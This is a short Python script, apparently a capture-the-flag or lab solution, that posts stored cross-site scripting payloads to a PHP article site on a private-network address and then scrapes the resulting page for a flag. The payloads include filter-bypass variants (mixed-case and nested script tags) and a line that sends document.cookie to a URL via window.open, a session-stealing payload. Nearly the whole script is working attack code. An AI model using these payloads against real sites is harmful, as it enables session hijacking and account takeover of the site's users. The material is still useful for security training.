import requests
import urllib.parse
import bs4
#上传payload
payload='''<img src=x onerror=alert(1)>
<script>alert(2)</script>
<script>window.open(\'http://192.168.157.138:8000/test.php?cookie=\'+document.cookie)</script>
<sCrIPt>alert(4)</ScripT>
<Sscriptcript>alert(5)</Sscriptcript>'''
url='http://192.168.157.138:8000/new_article.php'
headers={
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.183',
    'cookie':'pma_lang=zh_CN; PHPSESSID=14a63efcc4a85fef312a6a708a71abd8',
    'content-type':'application/x-www-form-urlencoded'
}
data=f'title=111&content={urllib.parse.quote(payload)}'
response=requests.post(url=url,headers=headers,data=data)
#print(response.status_code)

#获取文章列表
url='http://192.168.157.138:8000/article_list.php'
response=requests.get(url=url,headers=headers).text
soup=bs4.BeautifulSoup(response,features="html.parser")
# print(soup)
href=soup.find('table').find_all('tr')[2].find_all('td')[3].find_all('a')[0]['href']
href='http://192.168.157.138:8000/'+href
#查看文章找到flag
response=requests.get(url=href,headers=headers).text
soup=bs4.BeautifulSoup(response,features="html.parser")
print(soup.find('div').text)